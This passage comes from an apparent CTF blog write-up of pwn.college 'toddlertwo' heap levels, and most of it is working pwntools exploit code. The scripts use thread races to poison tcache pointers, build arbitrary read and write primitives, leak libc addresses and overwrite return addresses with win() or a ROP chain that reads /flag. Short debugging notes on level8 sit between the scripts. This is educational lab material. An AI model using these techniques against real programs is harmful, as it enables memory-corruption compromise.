class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>++<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level2.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br><span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>binary_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>    binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><span class="hljs-comment">#LET&#x27;S ROLLING</span><br>win_addr = binary_base + <span class="hljs-number">0x1798</span><br>arbitrary_write(r1, r2, stored_rip_addr, [win_addr], <span class="hljs-literal">True</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;quit&#x27;</span>)<br>p.clean()<br><span class="hljs-built_in">print</span>(r1.clean().decode())<br></code></pre></div></td></tr></table></figure><h4 id="level6-7"><a href="#level6-7" class="headerlink" title="level6"></a>level6</h4><p>Storing the secret in the main thread’s heap.</p><p>what the difference with the previous one?</p><h4 id="level7-6"><a href="#level7-6" class="headerlink" title="level7"></a>level7</h4><p>there is no send_flag command and win() function. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x4040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+message_offset+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value[<span class="hljs-number">0</span>]) == <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(bytes): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value[<span class="hljs-number">0</span>]) == <span class="hljs-built_in">int</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(int): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-comment">#end of `if unalign:`</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level7.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>message_offset = <span class="hljs-number">0x4040</span><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br><span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>binary_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>    binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><br><span class="hljs-comment">#ROLLING!!!!!!!!!!!!!!!!!!!</span><br>libc = p.libc<br>libc.address = libc_base<br>rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\x0c\x0d\x0e\x20&quot;</span>)<br>rop.call(<span class="hljs-string">&quot;close&quot;</span>, [<span class="hljs-number">3</span>]) <span class="hljs-comment"># used for correctly execute sendfile.</span><br>rop.call(<span class="hljs-string">&quot;read&quot;</span>, [<span class="hljs-number">0</span>, libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">42</span>])<br>rop.call(<span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">0</span>])<br>rop.call(<span class="hljs-string">&quot;sendfile&quot;</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>])<br>rop.call(<span class="hljs-string">&quot;exit&quot;</span>, [<span class="hljs-number">42</span>])<br><br>arbitrary_write(r1, r2, stored_rip_addr, [rop.chain()], <span class="hljs-literal">True</span>)<br>r1.sendline(<span class="hljs-string">&quot;quit&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/flag\0&quot;</span>)<br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;LEAKED:&quot;</span>, p.readall())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EXITED: &quot;</span>, p.poll())<br></code></pre></div></td></tr></table></figure><h4 id="level8-6"><a href="#level8-6" class="headerlink" title="level8"></a>level8</h4><p>emmmm, i can’t figure out the difference.</p><p>ohhhh, it use the pthread_exit(), not the normal return, so the rop attack to the return address is no longer viable.</p><p>i may alter another thread’s return address, such as thread 3 scanf return. It just lies on the top of the challenge’s stack frame, so it is at the constant offset from somewhere in high address space.</p><blockquote><p>address of the return address pointer of thread 3 scanf is stored at where at a constant offset from store_rip_address with <del>-0x801000</del> bytes distance.</p><img src="../../image/pwn-modules/image-20220625102559622.png" alt="image-20220625102559622" style="zoom:80%;" /></blockquote><p>okay, the fscanf doesn’t have <code>push rbp</code> this procedure, so calc the distance between fscanf and stored_rip_address by <code>rbp+8</code> is purely inaccurate. the actual address of its return address should be checked by gdb into stack:</p><img src="../../image/pwn-modules/image-20220625153005802.png" alt="image-20220625153005802" style="zoom:80%;" /><p><del>the pwntools is going crazy</del>, i’m gonna crazy.</p><ol><li>the read syscall with first arg being 0 won’t simply work as i thouhgt. there is something strange when communicateing with main thread’s stdin/stdout – could child thread be influenced by it?</li><li>or try to calc the address of tcp channel fd(in TLS addressing by fs register)?</li></ol><blockquote><blockquote><p>the <code>mov rax, fs:0x28</code> means referencing the value stored in fsbase+0x28 then copy it to rax. there is no <strong>shifting</strong>. </p></blockquote><p>the second method looks more feasible. here it is(calc from libc_base):</p><img src="../../image/pwn-modules/image-20220625205927958.png" alt="image-20220625205927958" style="zoom:80%;" /><p>okay, it’s stream pointer, i go wrong again.</p><p><del>when i follow the pace of fscanf, i found that it finally use fd=6 to read data in.</del></p></blockquote><p>Fine, I am now absolutely grasping the principles. the <strong>first problem</strong> above is just a misunderstanding of all the file descriptor and file stream and threads. </p><ul><li>in this program, main thread use <code>accept()</code> to receive a socket connect and return a <code>fd</code>. then <code>run_thread()</code> use <code>fdopen()</code> to turn fd into a <em>FILE* stream</em>, and write this FILE pointer into thread local storage(that is fs-based addressing).</li><li>the FILE stream and file descriptor are interchangeable, first is a high level interface, the second is a low level interface. child threads use <code>fscanf</code> and <code>fprintf</code> to read from or write to the stream(that is fds), that means the whole program’s stdin, stdout, and stderr is still viable in chile thread. so <code>read(0, libc.bss(), 0x400)</code> is correct.</li><li>one more thing needed to notice is that before thread 3 returns from fscanf, somewhere on the stack will be overwritten with what bytes I send into. so I additionally calc the right gadget of <code>pop rdi</code> so that the ropchain works.</li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    <span class="hljs-comment">#pwn.gdb.attach(p, &#x27;init-pwndbg\n&#x27;)</span><br>    <span class="hljs-comment">#input(&#x27;press enter to continue&#x27;)</span><br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span 